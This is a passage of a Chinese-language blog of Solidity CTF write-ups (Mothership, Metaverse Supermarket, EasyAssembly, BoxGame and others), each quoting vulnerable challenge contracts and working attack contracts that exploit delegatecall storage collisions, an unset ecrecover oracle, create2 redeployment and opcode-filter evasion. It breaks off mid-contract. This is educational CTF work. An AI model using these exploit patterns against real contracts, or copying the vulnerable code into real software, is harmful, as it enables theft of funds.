所以说，只要重新通过调用reBorn函数，并传入指定的bytecode，被create2生成出来的addr，则会具备我指定的功能(由我传入的bytecode决定)，但是在调用reBorn函数之前，需要将之前部署的addr给kill掉。而capture函数则提供了可行性，但是有个if (!_isBorn || msg.sender != tx.origin) return;限制条件，简单，所以需要手动去毁掉addr合约。 当然，这题好像还有一种解决办法，就是通过capture函数进行捕获，address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))))这很明显就是publickey&#x3D;&gt;address的计算式，所以只要将player的publickey传入即可capture它，但是，形参是string类型的，公钥是bytes32类型的，我不知道咋转，这个思路就先搁置了。 3. solve攻击合约 12345678910111213141516171819202122contract PhoenixttoHacker &#123; Laboratory laboratory; constructor(address _laboratory) &#123; laboratory = Laboratory(_laboratory); &#125; function attack() public &#123; laboratory.reBorn(type(PhoenixttoHelper).creationCode); require(laboratory.isCaught(), &quot;You don&#x27;t catch it...&quot;); &#125;&#125;contract PhoenixttoHelper &#123; address public owner; function reBorn() public &#123; owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; // player&#x27;address &#125;&#125; Mothership1.question You and a small group of scientists have been working on a global counteroffensive against the invader.We’ve recovered some of the ship’s source code and need to find a way to hack it!You have already studied the code and realized that to survive you need to take control of the Mothership.Your objective is to hack the Mothership instance (change the hacked bool to true).Good luck, the earth’s future depends on you! 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236// SPDX-License-Identifier: MITpragma solidity 0.8.17;/// @title Hack the Mothership/// @author https://twitter.com/nicobevi_eth/// @notice A big alien float is near the Earth! You and an anon group of scientists have been working on a global counteroffensive against the invader. Hack the Mothership, save the earth/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hack-the-mothershipcontract Mothership &#123; address public leader; SpaceShip[] public fleet; mapping(address =&gt; SpaceShip) public captainRegisteredShip; bool public hacked; constructor() &#123; leader = msg.sender; address[5] memory captains = [ 0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004, 0x0000000000000000000000000000000000000005 ]; // Adding standard modules address cleaningModuleAddress = address(new CleaningModule()); address refuelModuleAddress = address(new RefuelModule()); address leadershipModuleAddress = address(new LeadershipModule()); for (uint8 i = 0; i &lt; 5; i++) &#123; SpaceShip _spaceship = new SpaceShip( captains[i], address(this), cleaningModuleAddress, refuelModuleAddress, leadershipModuleAddress ); fleet.push(_spaceship); captainRegisteredShip[captains[i]] = _spaceship; &#125; &#125; function addSpaceShipToFleet(SpaceShip spaceship) external &#123; require(leader == msg.sender, &quot;You are not our leader&quot;); fleet.push(spaceship); captainRegisteredShip[spaceship.captain()] = spaceship; &#125; function _isFleetMember(SpaceShip spaceship) private view returns (bool isFleetMember) &#123; uint8 len = uint8(fleet.length); for (uint8 i; i &lt; len; ++i) &#123; if (address(fleet[i]) == address(spaceship)) &#123; isFleetMember = true; break; &#125; &#125; &#125; /** * A new captain will be promoted if: * 1. Ship is part of the fleet * 2. Ship has no captain * 3. The new captain is not a captain already */ function assignNewCaptainToShip(address _newCaptain) external &#123; SpaceShip spaceship = SpaceShip(msg.sender); require(_isFleetMember(spaceship), &quot;You&#x27;re not part of the fleet&quot;); require(spaceship.captain() == address(0), &quot;Ship has a captain&quot;); require(address(captainRegisteredShip[_newCaptain]) == address(0), &quot;You&#x27;re a captain already&quot;); // register ship to captain captainRegisteredShip[_newCaptain] = spaceship; // Communicate that new captain has been approved to ship spaceship.newCaptainPromoted(_newCaptain); &#125; /** * A captain will be assigned as leader of the fleet if: * 1. The proposed leader is a spaceship captain * 2. All the other ships approve the promotion */ function promoteToLeader(address _leader) external &#123; SpaceShip leaderSpaceship = captainRegisteredShip[_leader]; // should have a registered ship require(address(leaderSpaceship) != address(0), &quot;is not a captain&quot;); // should be approved by other captains uint8 len = uint8(fleet.length); for (uint8 i; i &lt; len; ++i) &#123; SpaceShip spaceship = fleet[i]; // ignore captain ship if (address(spaceship) == address(leaderSpaceship)) &#123; continue; &#125; // should not revert if captain approves the new leader LeadershipModule(address(spaceship)).isLeaderApproved(_leader); &#125; // remove captain from his ship delete captainRegisteredShip[_leader]; leaderSpaceship.newCaptainPromoted(address(0)); leader = _leader; &#125; function hack() external &#123; require(leader == msg.sender, &quot;You are not our leader&quot;); hacked = true; &#125; function fleetLength() external view returns (uint256) &#123; return fleet.length; &#125; /** * ...the rest of the code is lost */&#125;contract SpaceShip &#123; address public captain; address[] public crew; Mothership public mothership; mapping(bytes4 =&gt; address) public modules; constructor( address _captain, address _mothership, address _cleaningModuleAddress, address _refuelModuleAddress, address _leadershipModuleAddress ) &#123; captain = _captain; mothership = Mothership(_mothership); // Adding standard modules modules[CleaningModule.replaceCleaningCompany.selector] = _cleaningModuleAddress; modules[RefuelModule.addAlternativeRefuelStationsCodes.selector] = _refuelModuleAddress; modules[LeadershipModule.isLeaderApproved.selector] = _leadershipModuleAddress; &#125; function _isCrewMember(address member) private view returns (bool isCrewMember) &#123; uint256 len = uint256(crew.length); for (uint256 i; i &lt; len; ++i) &#123; if (crew[i] == member) &#123; isCrewMember = true; break; &#125; &#125; &#125; function newCaptainPromoted(address _captain) external &#123; require(msg.sender == address(mothership), &quot;You are not our mother&quot;); captain = _captain; &#125; function askForNewCaptain(address _newCaptain) external &#123; require(_isCrewMember(msg.sender), &quot;Not part of the crew&quot;); require(captain == address(0), &quot;We have a captain already&quot;); mothership.assignNewCaptainToShip(_newCaptain); &#125; /** * This SpaceShip model has an advanced module system * Only the captain can upgrade the ship */ function addModule(bytes4 _moduleSig, address _moduleAddress) external &#123; require(msg.sender == captain, &quot;You are not our captain&quot;); modules[_moduleSig] = _moduleAddress; &#125; // solhint-disable-next-line no-complex-fallback fallback() external &#123; bytes4 sig4 = msg.sig; address module = modules[sig4]; require(module != address(0), &quot;invalid module&quot;); // call the module // solhint-disable-next-line avoid-low-level-calls (bool success,) = module.delegatecall(msg.data); if (!success) &#123; // return response error assembly &#123; returndatacopy(0, 0, returndatasize()) revert(0, returndatasize()) &#125; &#125; &#125;&#125;contract CleaningModule &#123; address private cleaningCompany; function replaceCleaningCompany(address _cleaningCompany) external &#123; cleaningCompany = _cleaningCompany; &#125; /** * ...the rest of the code is lost */&#125;contract RefuelModule &#123; uint256 private mainRefuelStation; uint256[] private alternativeRefuelStationsCodes; function addAlternativeRefuelStationsCodes(uint256 refuelStationCode) external &#123; alternativeRefuelStationsCodes.push(refuelStationCode); &#125; /** * ...the rest of the code is lost */&#125;contract LeadershipModule &#123; function isLeaderApproved(address) external pure &#123; revert(&quot;We don&#x27;t want a new leader :(&quot;); &#125; /** * ...the rest of the code is lost */&#125;/** * ...the rest of the code is lost */ 2. analysis 这题很有意思，考察了很多点： 仔细分析题目：要想使hacked变成true，只能通过hack函数，而调用该函数的前提是成为leader，promoteToLeader函数提供了可行性，但是需要通过一系列限制，分析promoteToLeader函数 123456789101112131415161718192021222324function promoteToLeader(address _leader) external &#123; SpaceShip leaderSpaceship = captainRegisteredShip[_leader]; // should have a registered ship require(address(leaderSpaceship) != address(0), &quot;is not a captain&quot;); // should be approved by other captains uint8 len = uint8(fleet.length); for (uint8 i; i &lt; len; ++i) &#123; SpaceShip spaceship = fleet[i]; // ignore captain ship if (address(spaceship) == address(leaderSpaceship)) &#123; continue; &#125; // should not revert if captain approves the new leader LeadershipModule(address(spaceship)).isLeaderApproved(_leader); &#125; // remove captain from his ship delete captainRegisteredShip[_leader]; leaderSpaceship.newCaptainPromoted(address(0)); leader = _leader;&#125; 首先是满足captainRegisteredShip[_leader] != address(0)，要想满足该条件只能通过assignNewCaptainToShip函数，分析assignNewCaptainToShip函数可知，第一关则是满足isFleetMember(SpaceShip(msg.sender))==true，于是乎，看到_isFleetMember(SpaceShip spaceship)函数，只有spaceship被加入到fleet中才能返回true，而msg.sender是没有被加入到fleet中的，唯一的添加途径是通过addSpaceShipToFleet函数，但是该函数只能由leader调用，我们的初衷就是成为leader，所以该方法不可行。 看到SpaceShip合约，askForNewCaptain函数中有这样一句代码mothership.assignNewCaptainToShip(_newCaptain);，意味着可以通过该函数调用MotherShip中的assignNewCaptainToShip，因为该spaceship可以从公开的fleet中获取其地址，从而进行操作。 要想成功调用该函数，需要满足两个限制条件，*require(_isCrewMember(msg.sender), “Not part of the crew”); require(captain &#x3D;&#x3D; address(0), “We have a captain already”);这里很巧妙的，看到该合约的回调函数fallback，其函数的逻辑和代理合约中的回调函数简直一模一样，只不过它只能调用某些限定的函数，但这无所谓了，这几个函数已经可以满足要求了，delegatacall调用最容易发生的就是插槽冲突从而导致的覆盖。SpaceShip中的_isCrewMember函数，需要member为crew中的成员才返回true，而RefuelModule合约中的addAlternativeRefuelStationsCodes，则为我提供了使得member成为crew中的一员的可能性。再看到CleaningModule合约的replaceCleaningCompany函数为修改captain的值提供了可行性。当然，还有一点很重要就是要先成为captain，为了调用addModule函数，将modules[LeadershipModule.isLeaderApproved.selector] 对应的地址修改为hacker的地址，其目的是为了成功MotherShip中promoteToLeader函数中的LeadershipModule(address(spaceship)).isLeaderApproved(_leader);*，因为原始的LeadershipModule中的该函数不能调用成功，所以这里有点繁琐，需要通过for循环将fleet中的5个LeadershipModule全部改掉。 完成上述步骤之后，hacker可以成为leader了，然后调用hack函数，攻击该母舰。 📌 woc，分析出来之后，然后酷酷写代码，写了这么多！！！！居然一次就hack成功了！！！ 3. solve攻击合约 攻击逻辑：先部署LeadershipFake，然后部署MotherShip，将部署出来的mothership地址用于部署MotherShipHacker，然后将LeadshipFake传入attack函数中，即可完成攻击。 12345678910111213141516171819202122232425262728293031323334353637383940414243contract MotherShipHacker &#123; Mothership mothership; SpaceShip spaceship; constructor(address _mothership) &#123; mothership = Mothership(_mothership); spaceship = mothership.fleet(0); &#125; function attack(address leadershipFake) public &#123; // change spaceship&#x27;s LeadershipModule for (uint i; i &lt; 5; i++) &#123; SpaceShip _spaceship = mothership.fleet(i); // become SpaceShip&#x27;s captain address(_spaceship).call(abi.encodeWithSelector(CleaningModule.replaceCleaningCompany.selector, address(this))); _spaceship.addModule(bytes4(abi.encodeWithSignature(&quot;isLeaderApproved(address)&quot;)), leadershipFake); &#125; /* operate the spaceship */ // change spaceship&#x27;s captain to address(0) address(spaceship).call(abi.encodeWithSelector(CleaningModule.replaceCleaningCompany.selector, address(0))); // push hacker into crew address(spaceship).call(abi.encodeWithSelector(RefuelModule.addAlternativeRefuelStationsCodes.selector, uint(uint160(address(this))))); // call MotherShip&#x27;s assignNewCaptainToShip spaceship.askForNewCaptain(address(this)); // become MotherShi&#x27;s leader mothership.promoteToLeader(address(this)); // hack the mothership mothership.hack(); require(mothership.hacked(), &quot;The mothership is not been hacked...&quot;); &#125;&#125;contract LeadershipFake &#123; function isLeaderApproved(address) external pure &#123;&#125;&#125; Metaverse Supermarket1.question We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. Stability has become a scarce resource and even going to the store is a painful experience: we need to rely on oracles that sign off-chain data that lasts a couple of blocks because updating prices on-chain would be complete madness.You are out of INFLAs and you are starving, can you defeat the system? 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112// SPDX-License-Identifier: MITpragma solidity 0.8.17;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/25fe191202c44c762bc2a933913e21b37200f0e9/contracts/utils/cryptography/EIP712.sol&quot;;struct OraclePrice &#123; uint256 blockNumber; uint256 price;&#125;struct Signature &#123; uint8 v; bytes32 r; bytes32 s;&#125;abstract contract InflaStoreEIP712 is EIP712 &#123; bytes32 public constant ORACLE_PRICE_TYPEHASH = keccak256(&quot;OraclePrice(uint256 blockNumber,uint256 price)&quot;); function _hashOraclePrice(OraclePrice memory oraclePrice) internal view returns (bytes32 hash) &#123; return _hashTypedDataV4( keccak256(abi.encode(ORACLE_PRICE_TYPEHASH, oraclePrice.blockNumber, oraclePrice.price)) ); &#125;&#125;/// @title Metaverse Supermarket/// @author https://twitter.com/adrianromero/// @notice We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. You are out of INFLAs and you are starving, can you defeat the system?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/metaverse-supermarketcontract InflaStore is InflaStoreEIP712 &#123; Meal public immutable meal; Infla public immutable infla; address private owner; address private oracle; uint256 public constant MEAL_PRICE = 1e6; uint256 public constant BLOCK_RANGE = 10; constructor(address player) EIP712(&quot;InflaStore&quot;, &quot;1.0&quot;) &#123; meal = new Meal(); infla = new Infla(player, 10); owner = msg.sender; &#125; function setOracle(address _oracle) external &#123; require(owner == msg.sender, &quot;!owner&quot;); oracle = _oracle; &#125; function buy() external &#123; _mintMeal(msg.sender, MEAL_PRICE); &#125; function buyUsingOracle(OraclePrice calldata oraclePrice, Signature calldata signature) external &#123; _validateOraclePrice(oraclePrice, signature); _mintMeal(msg.sender, oraclePrice.price); &#125; function _mintMeal(address buyer, uint256 price) private &#123; infla.transferFrom(buyer, address(this), price); meal.safeMint(buyer); &#125; function _validateOraclePrice(OraclePrice calldata oraclePrice, Signature calldata signature) private view &#123; require(block.number - oraclePrice.blockNumber &lt; BLOCK_RANGE, &quot;price too old!&quot;); bytes32 oracleHash = _hashOraclePrice(oraclePrice); address recovered = _recover(oracleHash, signature.v, signature.r, signature.s); require(recovered == oracle, &quot;not oracle!&quot;); &#125; function _recover(bytes32 digest, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) &#123; require(v == 27 || v == 28, &quot;invalid v!&quot;); return ecrecover(digest, v, r, s); &#125;&#125;import &quot;https://github.com/transmissions11/solmate/blob/c2594bf4635ad773a8f4763e20b7e79582e41535/src/tokens/ERC721.sol&quot;;contract Meal is ERC721(&quot;Meal&quot;, &quot;MEAL&quot;) &#123; address private immutable _owner; uint256 private _tokenIdCounter; constructor() &#123; _owner = msg.sender; &#125; function safeMint(address to) external &#123; require(_owner == msg.sender, &quot;Only owner can mint&quot;); uint256 tokenId = _tokenIdCounter; unchecked &#123; ++_tokenIdCounter; &#125; _safeMint(to, tokenId); &#125; function tokenURI(uint256) public pure override returns (string memory) &#123; return &quot;ipfs://QmQqCFY7Dt9SFgadayt8eeTr7i5XauiswxeLysexbymGp1&quot;; &#125;&#125;import &quot;https://github.com/transmissions11/solmate/blob/c2594bf4635ad773a8f4763e20b7e79582e41535/src/tokens/ERC20.sol&quot;;contract Infla is ERC20(&quot;INFLA&quot;, &quot;INF&quot;, 18) &#123; constructor(address player, uint256 amount) &#123; _mint(player, amount); &#125;&#125; 2. analysis 这道题要求是让自己不挨饿，什么意思呢，就是拥有meal，即ERC721代币不为零，而能铸币的函数只有两个，buy() 和 buyUsingOracle()，想要“吃饭”必须要有MEAL_PRICE这么多钱，而我们手中的钱远远不够，所以，只能通过buyUsingOracle()函数。分析_validateOraclePrice()函数，要求传入两个结构体，通过OraclePrice获取签名，且签名结果已被固定算法生成了，所以这几乎是不可能通过recover恢复出的地址和oracle相同（*当然，这是在oracle被初始化的情况下，但实际上，该oracle并没有被初始化，其值为address(0)）所以，这要让_recover(oracleHash, signature.v, signature.r, signature.s)返回address(0)即可。 如何返回address(0)呢，只要让ecrecover在计算过程中出现错误即可返回address(0)那么该如何出错呢， 查了一下资料，只需让signature.v 不等于27或28，或signature.r=0，或signature.s=0即可。 还有一点，就是想要通过Infla合约，让player给InflaStore合约授权，为了执行infla.transferFrom(buyer, address(this), price);，同时hacker合约需要实现IERC721Receiver接口，否则， meal.safeMint(buyer);将无法执行。 3. solve攻击逻辑：先部署hacker，让hacker成为InflaStore的player，再然后，调用attack传入inflastore，即可完成攻击。 攻击合约 123456789101112131415161718192021222324252627282930313233343536373839404142434445interface IERC721Receiver &#123; function onERC721Received( address operator, address from, uint256 tokenId, bytes calldata data ) external returns (bytes4);&#125;contract SupermarketHacker is IERC721Receiver &#123; InflaStore store; Meal meal; Infla infla; address hacker; function attack(address _store) public &#123; // init store = InflaStore(_store); meal = store.meal(); hacker = msg.sender; infla = store.infla(); // create signature Signature memory signature = Signature(27, 0, 0); // create oracleprice OraclePrice memory oracleprice = OraclePrice(block.number, 1); // ERC20 approve infla.approve(address(store), type(uint).max); // mint meal store.buyUsingOracle(oracleprice, signature); require(meal.balanceOf(address(this)) &gt; 0, &quot;you have not meal, you still stave...&quot;); &#125; function onERC721Received( address, address, uint256, bytes calldata ) external virtual returns (bytes4) &#123; return IERC721Receiver.onERC721Received.selector; &#125;&#125; 嗯哼，收工~🤪","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"CTFProtocol","slug":"CTFS/CTFProtocol","permalink":"https://biyouqiuqiu.com/categories/CTFS/CTFProtocol/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"opcodes(7)❌","slug":"CTFS/ChainFlag/opcodes/opcodes(7)","date":"2023-08-27T07:10:10.000Z","updated":"2023-08-27T07:10:10.000Z","comments":true,"path":"2023/08/27/CTFS/ChainFlag/opcodes/opcodes(7)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/27/CTFS/ChainFlag/opcodes/opcodes(7)/","excerpt":"","text":"EasyAssembly1. question源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109pragma solidity ^0.5.10;contract EasyAssembly &#123; event SendFlag(address addr); uint randomNumber = 0; bytes32 private constant ownerslot = keccak256(&#x27;Welcome to qwb!!! You will find this so easy ~ Happy happy :D&#x27;); bytes32[] public puzzle; uint count = 0; mapping(address=&gt;bytes32) WinChecksum; constructor() public payable &#123; setAddress(ownerslot, msg.sender); &#125; modifier onlyWin(bytes memory code) &#123; require(WinChecksum[msg.sender] != 0); bytes32 tmp = keccak256(abi.encodePacked(code)); address target; assembly &#123; let t1,t2,t3 t1 := and(tmp, 0xffffffffffffffff) t2 := and(shr(0x40,tmp), 0xffffffffffffffff) t3 := and(shr(0x80,tmp), 0xffffffff) target := xor(mul(xor(mul(t3, 0x10000000000000000), t2), 0x10000000000000000), t1) &#125; require(address(target)==msg.sender); _; &#125; function setAddress(bytes32 _slot, address _address) internal &#123; bytes32 s = _slot; assembly &#123; sstore(s, _address) &#125; &#125; function deploy(bytes memory code) internal returns(address addr) &#123; assembly &#123; addr := create2(0, add(code, 0x20), mload(code), 0x1234) if eq(extcodesize(addr), 0) &#123; revert(0, 0) &#125; &#125; &#125; function gift() public payable &#123; require(count == 0); count += 1; if(msg.value &gt;= address(this).balance)&#123; emit SendFlag(msg.sender); &#125;else&#123; selfdestruct(msg.sender); &#125; &#125; function pass(uint idx, bytes memory bytecode) public &#123; address addr = deploy(bytecode); bytes32 cs = tag(bytecode); bytes32 tmp = keccak256(abi.encodePacked(uint(1))); uint32 v; bool flag = false; assembly &#123; let v1,v2 v := sload(add(tmp, idx)) if gt(v, sload(0))&#123; v1 := and(add(and(v,0xffffffff), and(shr(0x20,v), 0xffffffff)), 0xffffffff) v2 := and(add(xor(and(shr(0x40,v), 0xffffffff), and(shr(0x60,v), 0xffffffff)), and(shr(0x80,v),0xffffffff)), 0xffffffff) if eq(xor(mul(v2,0x100000000), v1), cs)&#123; flag := 1 &#125; &#125; &#125; if(flag)&#123; WinChecksum[addr] = cs; &#125;else&#123; WinChecksum[addr] = bytes32(0); &#125; &#125; function tag(bytes memory a) pure public returns(bytes32 cs) &#123; assembly&#123; let groupsize := 16 let head := add(a,groupsize) let tail := add(head, mload(a)) let t1 := 0x13145210 let t2 := 0x80238023 let m1,m2,m3,m4,s,tmp for &#123; let i := head &#125; lt(i, tail) &#123; i := add(i, groupsize) &#125; &#123; s := 0x59129121 tmp := mload(i) m1 := and(tmp,0xffffffff) m2 := and(shr(0x20,tmp),0xffffffff) m3 := and(shr(0x40,tmp),0xffffffff) m4 := and(shr(0x60,tmp),0xffffffff) for &#123; let j := 0 &#125; lt(j, 0x4) &#123; j := add(j, 1) &#125; &#123; s := and(mul(s, 2),0xffffffff) t2 := and(add(t1, xor(sub(mul(t1, 0x10), m1),xor(add(t1, s),add(div(t1,0x20), m2)))), 0xffffffff) t1 := and(add(t2, xor(add(mul(t2, 0x10), m3),xor(add(t2, s),sub(div(t2,0x20), m4)))), 0xffffffff) &#125; &#125; cs := xor(mul(t1,0x100000000),t2) &#125; &#125; function payforflag(bytes memory code) public onlyWin(code) &#123; emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125;&#125; 触发 emit SendFlag(msg.sender); 2. analysis 这题卡在了不会算 CS 纵观代码，可知触发 emit SendFlag(msg.sender);的有gift，payforflag函数，但是由之前的经验可知msg.value永远不可能大于address(this).balance，只有payforflag有希望。 分析payforflag，只要通过了 onlyWin 修饰器，就可以成功调用。 分析onlyWin，需要WinChecksum[msg.sender] != 0，这需要在 pass函数中才能实现，继续往下看 1234567891011121314bytes32 tmp = keccak256(abi.encodePacked(code));address target;/* 牛的：这一顿操作，其实就是取 tem的后20bytes*/assembly &#123; let t1,t2,t3 t1 := and(tmp, 0xffffffffffffffff) t2 := and(shr(0x40,tmp), 0xffffffffffffffff) t3 := and(shr(0x80,tmp), 0xffffffff) target := xor(mul(xor(mul(t3, 0x10000000000000000), t2), 0x10000000000000000), t1)&#125;require(address(target)==msg.sender);_; 分析可知，汇编的作用就是，截取tem的后20bytes，也就是一个地址的长度。 那么如何实现，address(target)&#x3D;&#x3D;msg.sender)，其实很简单，只要知道create2的工作原理就很简单，其实address = address(uint1600(uint(keccak256(abi.encodePacked(0xFF,address(deployer),salt,keccak256(abi.encodePacked(bytecode)))))))，简单说来就是：*keccak256(0xff||deployer||salt||keccak256(bytecode))*，所以传入的形参code，我们可以自己将其拼接好。 分析pass函数，其中的汇编如下： 12345678910111213141516171819/* 如下汇编可以理解为： 将32bytes的tem，8个bytes的块；s7，s6，s5，s4，s3，s2，s1，s0 v1 = (s0 + s1 + 0xffffffff) &amp;&amp; 0xffffffff v2 = ((s3 ^ s4) + s5) &amp;&amp; 0xffffffff 将 v1 拼接到 v2 后面， 再和 cs 做比较*/assembly &#123; let v1,v2 v := sload(add(tmp, idx)) // 需要找到一个slot的值不为0的 if gt(v, sload(0))&#123; v1 := and(add(and(v,0xffffffff), and(shr(0x20,v), 0xffffffff)), 0xffffffff) v2 := and(add(xor(and(shr(0x40,v), 0xffffffff), and(shr(0x60,v), 0xffffffff)), and(shr(0x80,v),0xffffffff)), 0xffffffff) if eq(xor(mul(v2,0x100000000), v1), cs)&#123; flag := 1 &#125; &#125;&#125; 汇编中的v可以令其add(tem,idx)的值等于slot_ownerslot即可，这个应该不难算，idx&#x3D;slot_ownerslot-tem即可。这里xor(mul(v2,0x100000000), v1)的值是被固定了的，即对keccak256(abi.encodePacked(uint(1)))进行一系列操作得到的，所以能让他们俩相等的唯一办法就是控制cs的值。 分析tag函数，这个函数就很恐怖了。。。。 我暂时不会，这里是大佬的博客： link 3. solve1// It is difficult for me.... BoxGame1. question源码 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; constructor(bytes memory a) payable public &#123; assembly &#123; return(add(0x20, a), mload(a)) &#125; &#125; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); target.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; 我是真不知道大佬是怎么看出来，这不是真正的合约，真正部署到脸上的合约是，构造器返回的a，我直接亚麻呆住了，如下是 RealContract： 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; 我直呼 666，这题的目的是触发 ForFlag事件。 2. analysis 这题要求我们，在传入的 _addr的runtimeCode中，不出现0xf0 0xf1 0xf2 0xf4 0xfa 0xff，这就需要构建 bytecode了。 delegatecall可以利用其特性，在addr中触发 ForFlag，实际上触发的是BoxGame中ForFlag。 而且，通过对内联汇编 log1的学习，其实在攻击合约中可以不定义 event（同文件下其他合约中定义了即可，详情请看：这里），尽量简化攻击合约，尽可能将攻击合约的bytecode最小化。 _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;))，很明显需要在hacker合约中编写回调函数，在内联汇编中，log1(offset, size, topic)其中topic是事件的hash，本题是，keccak256(abi.encodePacked(&quot;ForFlag(address)&quot;))，可以简单通过 cast 指令算出，如下 按理来说，攻击函数可以写成，如下 12345678910111213contract BoxGameHacker &#123; function() external &#123; address owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; bytes32 eventHash = keccak256(abi.encodePacked(&quot;ForFlag(address)&quot;)); assembly &#123; mstore(0x80, owner) log1(0x80, 0x20, eventHash) &#125; &#125;&#125; 其实不用试也知道，这个hacker合约中的runtimecode不行，因为，在keccak256(abi.encodePacked(&quot;ForFlag(address)&quot;))中已经出现了，f0和f1(其实这不是f1，而是0f，1f不过不管了，问题不大)，所以可将这个值拆分为如下： 1234567bytes32 eventHash = 0x89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e2;uint v = 0x100000000000000000000000000000000001000000000000000000;assembly &#123; mstore(0x80, owner) log1(0x80, 0x20, add(eventHash, v))&#125; 0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2=0x89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e2+0x100000000000000000000000000000000001000000000000000000这样就避免了f0和f1。 此时的bytecode为 10x6080604052348015600f57600080fd5b5060b780601d6000396000f3fe6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000fea265627a7a72315820048f42c13217b95d2c73187effa267c0fc8d0018eae54833b5fc94fe028682ec64736f6c63430005110032 runtimecode为 10x6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000fea265627a7a72315820048f42c13217b95d2c73187effa267c0fc8d0018eae54833b5fc94fe028682ec64736f6c63430005110032 metadata为 10xfea265627a7a72315820048f42c13217b95d2c73187effa267c0fc8d0018eae54833b5fc94fe028682ec64736f6c63430005110032 但是，bytecode中还是有f4,fa,ff，但是这三个恰好在metadata部分，使用create2创建合约的时候，将bytecode中的metadata部分删掉，其实不会影响合约的创建，metadata学习。 先计算该bytecode中的runtimecode的长度，计算结果为0x82 故直接修改部署字节码，将return的长度修改为0x82，去除最后的部分即可 最后的bytecode为 10x6080604052348015600f57600080fd5b50608280601d6000396000f3fe6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000fea265627a7a72315820048f42c13217b95d2c73187effa267c0fc8d0018eae54833b5fc94fe028682ec64736f6c63430005110032 runtimecode为(因为长度由原来的0xb7变成了0x82) 10x6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000 而在BoxGame合约中，extcodecopy获取到的code为，如上runtimecode即不包括(0xf0 0xf1 0xf2 0xf4 0xfa 0xff)，使用上面的bytecode部署攻击合约后，将其地址作为参数，调用题目合约的payforflag函数，即可触发ForFlag事件。 3. solve攻击合约 12345678910111213141516171819202122232425262728293031323334// create bytecodecontract BoxGameHacker &#123; function() external &#123; address owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; // bytes32 eventHash = keccak256(abi.encodePacked(&quot;ForFlag(address)&quot;)); bytes32 eventHash = 0x89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e2; uint v = 0x100000000000000000000000000000000001000000000000000000; assembly 